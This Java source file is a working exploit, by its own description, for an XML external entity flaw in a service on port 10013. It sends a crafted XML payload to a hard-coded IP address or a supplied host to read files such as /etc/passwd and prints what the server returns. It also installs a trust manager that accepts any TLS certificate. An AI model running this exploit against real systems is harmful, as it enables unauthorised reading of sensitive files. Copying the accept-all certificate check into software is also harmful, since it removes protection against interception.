import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.Socket;
import java.security.KeyStore;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;

import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.TrustManagerFactory;
import javax.net.ssl.X509TrustManager;

/**
 * Program to exploit XEE vulnerability in port 10013
 * how to run :  java TestXEEVulnerability IP FILE
 * 
 * @author satul
 *
 */
public class TestXEEVulnerability {
	// private static final String SERVER = "localhost";
	private static String SERVER = "164.99.175.165";
	private static final int PORT = 10013;
	private static String fileName = "//etc//passwd";

	private static final String xml1 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE updateProfile [ <!ENTITY file SYSTEM \"file:/";
	private static final String xml2 = "\"> ]> <Connect><ConnectionID>19&file;-1</ConnectionID><ClientID>19&file;</ClientID></Connect>";
	private static String xml = xml1 + fileName + xml2;
	
	public static void main(String[] args) throws Exception {
		if(args.length == 2){
			SERVER = args[0];
			
			fileName = args[1].replace("/", "//");
			xml = xml1 + fileName + xml2;
			System.out.println("Trying to read " + fileName + " by exploiting XEE vulnerability on host " + SERVER);
		}
		
		
		try {
			final SSLSocket soc = (SSLSocket)getSSLSocket();			
			
            DataOutputStream outputDataStream = new DataOutputStream(soc.getOutputStream());
            outputDataStream.write(6);
            outputDataStream.writeInt(xml.getBytes().length);
            outputDataStream.write(xml.getBytes());        
            outputDataStream.flush();
            
            Thread reader = new Thread(){
            	public void run() {
            		try{
	                    BufferedReader reader = new BufferedReader(new InputStreamReader(soc.getInputStream()));
	                    String line = null;
	                    while((line = reader.readLine()) != null){
	                    	System.out.println(line);
	                    }
            		}catch(Exception e){
            			e.printStackTrace();
            		}
            	};
            };

            reader.start();
            reader.join(5000);
            
            soc.close();
		} catch (Exception e) {
			System.out.println(e.getMessage());
			//e.printStackTrace();
		}
	}

	private static Socket getSSLSocket() {
		SSLSocketFactory factory = null;
		try {
			SSLContext ctx;
			KeyManagerFactory kmf;
			KeyStore ks = null;
			ctx = SSLContext.getInstance("TLS");
			
			kmf = KeyManagerFactory.getInstance(KeyManagerFactory
					.getDefaultAlgorithm());
			ks = KeyStore.getInstance("JKS");
			ks.load(null, null);
			kmf.init(ks, null);

			TrustManagerFactory tmFactory = TrustManagerFactory
					.getInstance(TrustManagerFactory.getDefaultAlgorithm());
			tmFactory.init(ks);
			TrustManager[] trustManagers = tmFactory.getTrustManagers();
			X509TrustManager defaultTM = (X509TrustManager) trustManagers[0];
			X509TrustManager allowAll = new X509TrustManager() {
				public void checkClientTrusted(X509Certificate[] chain,
						String authType) throws CertificateException {
				}

				public void checkServerTrusted(X509Certificate[] chain,
						String authType) throws CertificateException {
					if (true) {
						return;
					}

					if (chain != null && chain.length > 0) {
						for (X509Certificate cert : chain) {
							cert.checkValidity();
						}
					}
				}

				public X509Certificate[] getAcceptedIssuers() {
					return null;
				}

			};

			ctx.init(kmf.getKeyManagers(), new TrustManager[] { allowAll },
					null);

			factory = ctx.getSocketFactory();
			return (SSLSocket) factory.createSocket(SERVER, PORT);

		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;

	}

}
